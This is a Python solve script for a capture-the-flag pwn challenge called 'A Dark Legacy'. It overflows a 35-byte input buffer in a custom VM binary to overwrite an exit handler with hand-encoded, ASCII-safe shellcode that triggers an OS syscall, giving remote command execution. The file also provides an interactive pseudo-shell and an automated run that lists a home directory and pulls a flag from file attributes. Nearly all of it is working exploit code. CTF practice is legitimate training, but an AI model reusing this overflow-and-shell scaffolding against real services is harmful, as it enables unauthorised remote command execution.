# solve.py — A Dark Legacy (PWN Challenge) exploit
# Overflow READ_STR buffer to overwrite EXIT handler with OS syscall
# All shellcode bytes are ASCII-safe (< 0x80) — survives UTF-8 decode
# Exploits preserved register state: RB=bufAddr, RC=35 after READ_STR

import socket
import sys
import argparse

# Binary layout (from assembled Legacy.rune)
BUFADDR = 0x298  # input buffer in code segment
BUFSZ = 35  # buffer size = max command length
VALADDR = 0x2BB  # EXIT handler at BUFADDR + BUFSZ

# Register encoding (2-bit fields in 42-bit instruction)
# Only RA (0b01) is safe in the r0 slot — RB (0b10) and RC (0b11)
# produce bytes >= 0x80 which get mangled by UTF-8 decoding
RA, RB, RC = 0b01, 0b10, 0b11

# Opcodes (only 0x00–0x1F produce byte 4 < 0x80)
OP_MOV = 0x01
OP_DEC = 0x1D
OP_SYSCALL = 0x1F

# Connection defaults
DHOST = "127.0.0.1"
DPORT = 8492
DTIMEOUT = 10.0
MAXCMD = BUFSZ


def encInstr(op, r0=0, r1=0, r2=0, imm=0):
    # Encode 42-bit instruction -> 6 bytes little-endian
    imm24 = imm & 0xFFFFFF
    instr = (op << 34) | (r0 << 30) | (r1 << 28) | (r2 << 26) | imm24
    return instr.to_bytes(6, "little")


# Pre-built shellcode (3 instrs × 6B = 18B, all bytes < 0x80)
# After fn_read returns: RA=0, RB=0x298 (buf addr), RC=35 (buf len)
# Command string occupies the buffer itself (space-padded to 35B)
# OS syscall reads from RB for RC bytes, stopping at NUL
#
#   MOV  RA, 11        ->  0B 00 00 40 04 00
#   DEC  RA            ->  00 00 00 40 74 00   (RA=10, OS syscall)
#   SYSCALL RA, RB, RC ->  00 00 00 6C 7C 00
#
SHELLCODE = (
    encInstr(OP_MOV, r0=RA, imm=11)  # MOV RA, 11 (0x0A=newline)
    + encInstr(OP_DEC, r0=RA)  # DEC RA -> 10
    + encInstr(OP_SYSCALL, r0=RA, r1=RB, r2=RC)  # OS syscall
)


def mkPayload(cmd):
    # Payload: [cmd space-padded to 35B][shellcode 18B]
    # Command lives at BUFADDR — RB already points here
    # Shell ignores trailing spaces, so padding is harmless
    if len(cmd) > MAXCMD:
        print(f"[!] Command too long ({len(cmd)}B > {MAXCMD}B)", file=sys.stderr)
        sys.exit(1)

    cmdPad = cmd.ljust(BUFSZ).encode("ascii")
    pl = cmdPad + SHELLCODE

    if b"\n" in pl:
        bad = [i for i, b in enumerate(pl) if b == 0x0A]
        print(f"[!] Payload has 0x0A at {bad}", file=sys.stderr)
        sys.exit(1)

    return pl


def recvUntil(s, marker):
    # Receive until marker found or timeout
    buf = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if marker in buf:
                break
        except socket.timeout:
            break
    return buf


def recvAll(s):
    # Drain remaining socket data
    buf = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            break
    return buf


def runExploit(host, port, cmd, timeout=DTIMEOUT):
    # Connect, send payload, return command output
    pl = mkPayload(cmd)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((host, port))

    banner = recvUntil(s, b"> ")
    print(banner.decode("utf-8", errors="replace"), end="")

    s.sendall(pl + b"\n")
    print(f"[*] Sent {len(pl)}B ({BUFSZ} cmd + {len(SHELLCODE)} shellcode)")

    out = recvAll(s)
    s.close()
    return out.decode("utf-8", errors="replace")


def shell(host, port):
    # Pseudo-shell (reconnects per command — OS syscall is one-shot)
    print(f"[*] A Dark Legacy — pseudo-shell on {host}:{port}")
    print(f"[*] Max command length: {MAXCMD} bytes")
    print("[*] Type 'exit' or Ctrl+C to quit\n")
    while True:
        try:
            cmd = input("\033[91mshell>\033[0m ")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting")
            break
        cmd = cmd.strip()
        if cmd.lower() in ("exit", "quit"):
            break
        if not cmd:
            continue
        if len(cmd) > MAXCMD:
            print(f"[!] Too long ({len(cmd)}B > {MAXCMD}B)")
            continue
        try:
            out = runExploit(host, port, cmd, timeout=12)
            if out:
                print(out)
        except Exception as e:
            print(f"[!] {e}")


def autoExploit(host, port):
    # Automated flag extraction
    print("=" * 60)
    print("  A Dark Legacy — Automated Exploit")
    print("=" * 60)

    steps = [
        ("Running 'id'", "id"),
        ("Listing /home/ctfuser", "ls -la /home/ctfuser"),
        ("Reading .ssh (decoy key)", "cat /home/ctfuser/.ssh"),
        ("Dumping xattrs (flag!)", "getfattr -d /home/ctfuser/.ssh"),
    ]

    out = ""
    for i, (desc, cmd) in enumerate(steps, 1):
        print(f"\n[{i}] {desc}...")
        out = runExploit(host, port, cmd)
        for ln in out.strip().split("\n"):
            print(f"    {ln}")

    # Parse flag from getfattr -d output
    flag = ""
    for ln in out.strip().split("\n"):
        if "user.description" in ln:
            flag = ln.split("=", 1)[-1].strip().strip('"')
            break

    if flag:
        print("\n    ╔══════════════════════════════════╗")
        print(f"    ║  FLAG: {flag:<25s} ║")
        print("    ╚══════════════════════════════════╝")
    else:
        print("    [!] Flag not found — try --shell")


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="A Dark Legacy — PWN exploit")
    p.add_argument("--host", default=DHOST, help="Target host")
    p.add_argument("--port", type=int, default=DPORT, help="Target port")
    p.add_argument("--cmd", default=None, help="Single command (max 35B)")
    p.add_argument("--shell", action="store_true", help="Pseudo-shell mode")
    args = p.parse_args()

    if args.shell:
        shell(args.host, args.port)
    elif args.cmd:
        out = runExploit(args.host, args.port, args.cmd)
        print(out)
    else:
        autoExploit(args.host, args.port)
